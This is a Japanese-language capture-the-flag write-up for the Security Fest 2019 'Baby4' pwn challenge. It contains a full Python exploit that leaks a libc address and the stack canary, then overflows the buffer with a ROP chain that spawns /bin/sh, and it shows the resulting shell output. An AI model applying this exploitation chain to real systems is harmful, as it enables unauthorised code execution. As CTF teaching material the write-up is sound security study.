# [pwn 359pts] Baby4 - Security Fest 2019
64ビットで全部有効です。
```
$ checksec -f baby4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		1	baby4
```

IDAで解析すると、1文字ずつスタック上のバッファに書き込んでいけるようです。
バッファサイズよりも多く書き込め、1文字ごとにバッファの内容を出力してくれるので、canaryを破壊することなくlibc leakしつつリターンアドレスを書き換えられそうです。
one gadgetを書き込めば良さそう。
なぜか`__libc_start_main`に戻らないmainだったので、`_dl_fini`のアドレスを使ってlibc leakしました。

```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./baby4")

# leak libc base
payload = b'A' * 0x20
sock.recvuntil("<-- ")
sock.sendline(payload)
sock.recvuntil("--> ")
l = sock.recvline().rstrip()
addr_libc_start_main = u64(l[0x20:0x28])
libc_base = addr_libc_start_main - 0x4019a0
dump("libc base = " + hex(addr_libc_start_main))

# leak canary
payload = b'A' * 0x49
sock.recvuntil("<-- ")
sock.sendline(payload)
sock.recvuntil("--> ")
l = sock.recvline().rstrip()
canary = b'\x00' + l[0x49:0x50]
dump(b"canary = " + canary)

rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_syscall = libc_base + 0x000013c0

# stack overflow!
payload = b'A' * 0x48
payload += canary
payload += b'A' * 8
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.recvuntil("<-- ")
sock.sendline(payload)

# get the shell!
sock.recvuntil("<-- ")
sock.sendline("")

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=12632)
[ptrlib] libc base = 0x7fcdc90b09a0
[ptrlib] b'canary = \x00$\xdf\xbd\xcc\xc4-G'
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$ 
```

# 感想
libc配布されてないっぽいけどlibc databaseで出てくるのかな？
まぁBabyって書いてるし大丈夫でしょ。

# 参考文献
[1] [http://inaz2.hatenablog.com/entry/2014/07/27/205322](http://inaz2.hatenablog.com/entry/2014/07/27/205322)